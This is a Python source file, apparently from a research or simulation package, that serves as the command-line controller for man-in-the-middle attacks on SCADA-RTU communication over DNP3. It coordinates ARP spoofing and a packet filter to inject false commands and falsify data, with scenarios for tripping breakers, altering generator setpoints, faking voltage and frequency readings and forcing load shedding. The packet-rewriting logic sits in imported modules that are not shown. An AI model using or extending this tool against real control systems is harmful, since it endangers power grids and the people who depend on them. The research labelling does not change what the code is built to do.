"""
MiTM Attacker Controller

Main controller for orchestrating Man-in-the-Middle attacks on SCADA-RTU communication.
Combines ARP spoofing and DNP3 packet manipulation for False Command Injection (FCI)
and False Data Injection (FDI) attacks.
"""

import asyncio
import logging
import time
import argparse
import sys
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Print attack framework banner
print("🎯 MiTM Attack Simulation Package Loaded")
print("Version: 1.0.0")
print("Components: ARP Spoofing, Packet Filtering, Attack Controller, SCADA Integration")
print("⚠️  WARNING: For research and simulation purposes only!")

class AttackType(Enum):
    """Available attack types"""
    FALSE_COMMAND_INJECTION = "fci"
    FALSE_DATA_INJECTION = "fdi"
    DENIAL_OF_SERVICE = "dos"
    REPLAY_ATTACK = "replay"

class AttackScenario(Enum):
    """Predefined attack scenarios"""
    BREAKER_MANIPULATION = "breaker_trip_close"
    GENERATOR_SETPOINT = "generator_setpoint"
    VOLTAGE_MEASUREMENT = "voltage_false_reading"
    FREQUENCY_ATTACK = "frequency_manipulation"
    LOAD_SHEDDING = "load_shedding_attack"

@dataclass
class AttackConfig:
    """Attack configuration parameters"""
    target_scada_ip: str
    target_rtu_ip: str
    attack_types: List[AttackType]
    scenarios: List[AttackScenario]
    duration: int = 300  # 5 minutes default
    intensity: float = 1.0  # Attack intensity (0.0 - 1.0)
    stealth_mode: bool = True
    log_traffic: bool = True

@dataclass
class AttackStats:
    """Attack statistics tracking"""
    start_time: float
    packets_intercepted: int = 0
    packets_modified: int = 0
    commands_injected: int = 0
    data_manipulated: int = 0
    arp_packets_sent: int = 0
    attack_success_rate: float = 0.0

class MiTMAttacker:
    """
    Main Man-in-the-Middle attacker controller.
    Coordinates ARP spoofing and DNP3 packet manipulation attacks.
    """
    
    def __init__(self, interface: str = "eth0"):
        """
        Initialize MiTM attacker.
        
        Args:
            interface: Network interface for attacks
        """
        # Import here to avoid circular imports
        try:
            from .arp_spoof import ARPSpoofer
            from .packet_filter import PacketFilter
        except ImportError:
            # Fallback for direct script execution
            import sys
            import os
            sys.path.append(os.path.dirname(__file__))
            from arp_spoof import ARPSpoofer
            from packet_filter import PacketFilter
        
        self.interface = interface
        self.arp_spoofer = ARPSpoofer(interface)
        self.packet_filter = PacketFilter()
        
        self.is_attacking = False
        self.attack_config: Optional[AttackConfig] = None
        self.attack_stats = AttackStats(start_time=time.time())
        self.attack_task: Optional[asyncio.Task] = None
        
        logger.info("MiTM Attacker initialized")
    
    async def launch_attack(self, config: AttackConfig):
        """
        Launch coordinated MiTM attack.
        
        Args:
            config: Attack configuration parameters
        """
        if self.is_attacking:
            logger.warning("Attack already in progress")
            return
        
        self.attack_config = config
        self.is_attacking = True
        self.attack_stats = AttackStats(start_time=time.time())
        
        logger.warning("🚨 LAUNCHING MiTM ATTACK 🚨")
        logger.info(f"Target SCADA: {config.target_scada_ip}")
        logger.info(f"Target RTU: {config.target_rtu_ip}")
        logger.info(f"Attack Types: {[at.value for at in config.attack_types]}")
        logger.info(f"Scenarios: {[sc.value for sc in config.scenarios]}")
        logger.info(f"Duration: {config.duration} seconds")
        
        try:
            # Start attack components
            await self._start_attack_components(config)
            
            # Run main attack loop
            self.attack_task = asyncio.create_task(self._attack_loop(config))
            await self.attack_task
            
        except asyncio.CancelledError:
            logger.info("Attack cancelled")
        except Exception as e:
            logger.error(f"Attack failed: {e}")
        finally:
            await self.stop_attack()
    
    async def stop_attack(self):
        """Stop the MiTM attack and cleanup."""
        if not self.is_attacking:
            logger.warning("No attack in progress")
            return
        
        logger.info("🛑 STOPPING MiTM ATTACK")
        
        self.is_attacking = False
        
        # Cancel attack task
        if self.attack_task:
            self.attack_task.cancel()
            try:
                await self.attack_task
            except asyncio.CancelledError:
                pass
        
        # Stop attack components
        await self._stop_attack_components()
        
        # Print final statistics
        self._print_attack_summary()
        
        logger.info("MiTM attack stopped successfully")
    
    async def _start_attack_components(self, config: AttackConfig):
        """Start ARP spoofing and packet filtering."""
        logger.info("Starting attack components...")
        
        # Configure packet filter attacks
        attack_scenarios = []
        for attack_type in config.attack_types:
            if attack_type == AttackType.FALSE_COMMAND_INJECTION:
                attack_scenarios.extend(['binary_operate', 'analog_operate'])
            elif attack_type == AttackType.FALSE_DATA_INJECTION:
                attack_scenarios.extend(['read_response'])
        
        # Enable attack mode in packet filter
        self.packet_filter.enable_attack(attack_scenarios)
        
        # Start packet filtering
        target_ips = [config.target_scada_ip, config.target_rtu_ip]
        await self.packet_filter.start_filtering(target_ips)
        
        # Start ARP spoofing
        await self.arp_spoofer.start_spoofing(config.target_scada_ip, config.target_rtu_ip)
        
        logger.info("✅ All attack components started")
    
    async def _stop_attack_components(self):
        """Stop all attack components."""
        logger.info("Stopping attack components...")
        
        # Stop ARP spoofing
        await self.arp_spoofer.stop_spoofing()
        
        # Stop packet filtering
        await self.packet_filter.stop_filtering()
        
        logger.info("✅ All attack components stopped")
    
    async def _attack_loop(self, config: AttackConfig):
        """Main attack execution loop."""
        logger.info(f"🔥 ATTACK LOOP STARTED - Duration: {config.duration}s")
        
        start_time = time.time()
        last_stats_time = start_time
        
        try:
            while self.is_attacking and (time.time() - start_time) < config.duration:
                current_time = time.time()
                
                # Update statistics every 10 seconds
                if current_time - last_stats_time >= 10:
                    await self._update_attack_stats()
                    self._print_attack_status()
                    last_stats_time = current_time
                
                # Execute attack scenarios
                await self._execute_attack_scenarios(config)
                
                # Wait before next iteration
                await asyncio.sleep(1)
                
        except asyncio.CancelledError:
            logger.info("Attack loop cancelled")
            raise
        
        logger.info("🏁 ATTACK LOOP COMPLETED")
    
    async def _execute_attack_scenarios(self, config: AttackConfig):
        """Execute specific attack scenarios."""
        for scenario in config.scenarios:
            if scenario == AttackScenario.BREAKER_MANIPULATION:
                await self._execute_breaker_attack()
            elif scenario == AttackScenario.GENERATOR_SETPOINT:
                await self._execute_generator_attack()
            elif scenario == AttackScenario.VOLTAGE_MEASUREMENT:
                await self._execute_voltage_attack()
            elif scenario == AttackScenario.FREQUENCY_ATTACK:
                await self._execute_frequency_attack()
            elif scenario == AttackScenario.LOAD_SHEDDING:
                await self._execute_load_shedding_attack()
    
    async def _execute_breaker_attack(self):
        """Execute breaker manipulation attack."""
        # This would interact with the packet filter to modify breaker commands
        # The actual modification happens in the packet filter hooks
        logger.debug("🔥 Monitoring for breaker commands to manipulate...")
    
    async def _execute_generator_attack(self):
        """Execute generator setpoint attack."""
        logger.debug("🔥 Monitoring for generator commands to manipulate...")
    
    async def _execute_voltage_attack(self):
        """Execute voltage measurement manipulation."""
        logger.debug("🔥 Monitoring for voltage measurements to falsify...")
    
    async def _execute_frequency_attack(self):
        """Execute frequency measurement attack."""
        logger.debug("🔥 Monitoring for frequency data to manipulate...")
    
    async def _execute_load_shedding_attack(self):
        """Execute load shedding attack."""
        logger.debug("🔥 Monitoring for load control commands to manipulate...")
    
    async def _update_attack_stats(self):
        """Update attack statistics from components."""
        # Get statistics from packet filter
        filter_stats = self.packet_filter.get_statistics()
        
        self.attack_stats.packets_intercepted = filter_stats['packets_captured']
        self.attack_stats.packets_modified = filter_stats['packets_modified']
        
        # Calculate success rate
        if self.attack_stats.packets_intercepted > 0:
            self.attack_stats.attack_success_rate = (
                self.attack_stats.packets_modified / self.attack_stats.packets_intercepted * 100
            )
    
    def _print_attack_status(self):
        """Print current attack status."""
        runtime = time.time() - self.attack_stats.start_time
        
        logger.info("=" * 60)
        logger.info("🎯 MiTM ATTACK STATUS")
        logger.info("=" * 60)
        logger.info(f"Runtime: {runtime:.1f}s")
        logger.info(f"Packets Intercepted: {self.attack_stats.packets_intercepted}")
        logger.info(f"Packets Modified: {self.attack_stats.packets_modified}")
        logger.info(f"Success Rate: {self.attack_stats.attack_success_rate:.1f}%")
        logger.info(f"ARP Spoofing: {'🟢 Active' if self.arp_spoofer.is_spoofing else '🔴 Inactive'}")
        logger.info(f"Packet Filter: {'🟢 Active' if self.packet_filter.is_filtering else '🔴 Inactive'}")
        logger.info("=" * 60)
    
    def _print_attack_summary(self):
        """Print final attack summary."""
        runtime = time.time() - self.attack_stats.start_time
        
        print("\n" + "=" * 80)
        print("🎯 MiTM ATTACK SUMMARY")
        print("=" * 80)
        print(f"Total Runtime: {runtime:.1f} seconds")
        print(f"Packets Intercepted: {self.attack_stats.packets_intercepted:,}")
        print(f"Packets Modified: {self.attack_stats.packets_modified:,}")
        print(f"Commands Injected: {self.attack_stats.commands_injected:,}")
        print(f"Data Manipulated: {self.attack_stats.data_manipulated:,}")
        print(f"Overall Success Rate: {self.attack_stats.attack_success_rate:.2f}%")
        
        if self.attack_config:
            print(f"\nAttack Configuration:")
            print(f"  Target SCADA: {self.attack_config.target_scada_ip}")
            print(f"  Target RTU: {self.attack_config.target_rtu_ip}")
            print(f"  Attack Types: {[at.value for at in self.attack_config.attack_types]}")
            print(f"  Scenarios: {[sc.value for sc in self.attack_config.scenarios]}")
        
        print("=" * 80)
        print("⚠️  Remember: This is for research and simulation purposes only!")
        print("=" * 80 + "\n")
    
    def get_status(self) -> Dict:
        """Get current attacker status."""
        return {
            'is_attacking': self.is_attacking,
            'interface': self.interface,
            'attack_config': self.attack_config.__dict__ if self.attack_config else None,
            'attack_stats': self.attack_stats.__dict__,
            'arp_spoofer_status': self.arp_spoofer.get_status(),
            'packet_filter_stats': self.packet_filter.get_statistics()
        }

# Command Line Interface
async def main():
    """Main CLI entry point for MiTM attacks."""
    parser = argparse.ArgumentParser(
        description="MiTM Attacker for SCADA-RTU Communication",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python mitm/attacker.py --targets 192.168.1.100 192.168.1.101 --attacks fci --duration 60
  python mitm/attacker.py --target scada --victim rtu --attack fci --scenario breaker
  python mitm/attacker.py --targets 192.168.1.100 192.168.1.10 --attacks fci fdi --duration 300
        """
    )
    
    # Target specification
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument(
        '--targets', 
        nargs=2, 
        metavar=('SCADA_IP', 'RTU_IP'),
        help='Target IP addresses: SCADA master and RTU'
    )
    target_group.add_argument(
        '--target', 
        choices=['scada', 'rtu'],
        help='Predefined target type (requires --victim)'
    )
    
    parser.add_argument(
        '--victim',
        choices=['scada', 'rtu'],
        help='Victim type when using --target'
    )
    
    # Attack configuration
    parser.add_argument(
        '--attacks', '--attack',
        nargs='+',
        choices=['fci', 'fdi', 'dos', 'replay'],
        default=['fci'],
        help='Attack types to execute (default: fci)'
    )
    
    parser.add_argument(
        '--scenarios',
        nargs='+',
        choices=['breaker', 'generator', 'voltage', 'frequency', 'load_shedding'],
        default=['breaker'],
        help='Attack scenarios to execute (default: breaker)'
    )
    
    parser.add_argument(
        '--duration',
        type=int,
        default=60,
        help='Attack duration in seconds (default: 60)'
    )
    
    parser.add_argument(
        '--interface',
        default='eth0',
        help='Network interface for attacks (default: eth0)'
    )
    
    parser.add_argument(
        '--intensity',
        type=float,
        default=1.0,
        help='Attack intensity 0.0-1.0 (default: 1.0)'
    )
    
    parser.add_argument(
        '--stealth',
        action='store_true',
        default=True,
        help='Enable stealth mode (default: True)'
    )
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.target and not args.victim:
        parser.error("--victim is required when using --target")
    
    # Determine target IPs
    if args.targets:
        scada_ip, rtu_ip = args.targets
    else:
        # Use predefined IPs for simplified testing
        ip_mapping = {
            'scada': '192.168.1.100',
            'rtu': '192.168.1.10'
        }
        
        if args.target == 'scada':
            scada_ip = ip_mapping['scada']
            rtu_ip = ip_mapping['rtu']
        else:
            scada_ip = ip_mapping['rtu']
            rtu_ip = ip_mapping['scada']
    
    # Map attack types
    attack_type_mapping = {
        'fci': AttackType.FALSE_COMMAND_INJECTION,
        'fdi': AttackType.FALSE_DATA_INJECTION,
        'dos': AttackType.DENIAL_OF_SERVICE,
        'replay': AttackType.REPLAY_ATTACK
    }
    
    attack_types = [attack_type_mapping[at] for at in args.attacks]
    
    # Map scenarios
    scenario_mapping = {
        'breaker': AttackScenario.BREAKER_MANIPULATION,
        'generator': AttackScenario.GENERATOR_SETPOINT,
        'voltage': AttackScenario.VOLTAGE_MEASUREMENT,
        'frequency': AttackScenario.FREQUENCY_ATTACK,
        'load_shedding': AttackScenario.LOAD_SHEDDING
    }
    
    scenarios = [scenario_mapping[sc] for sc in args.scenarios]
    
    # Create attack configuration
    config = AttackConfig(
        target_scada_ip=scada_ip,
        target_rtu_ip=rtu_ip,
        attack_types=attack_types,
        scenarios=scenarios,
        duration=args.duration,
        intensity=args.intensity,
        stealth_mode=args.stealth,
        log_traffic=True
    )
    
    # Create and launch attacker
    attacker = MiTMAttacker(args.interface)
    
    try:
        await attacker.launch_attack(config)
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
        await attacker.stop_attack()
    except Exception as e:
        logger.error(f"Attack failed: {e}")
        await attacker.stop_attack()
        sys.exit(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
        sys.exit(0)
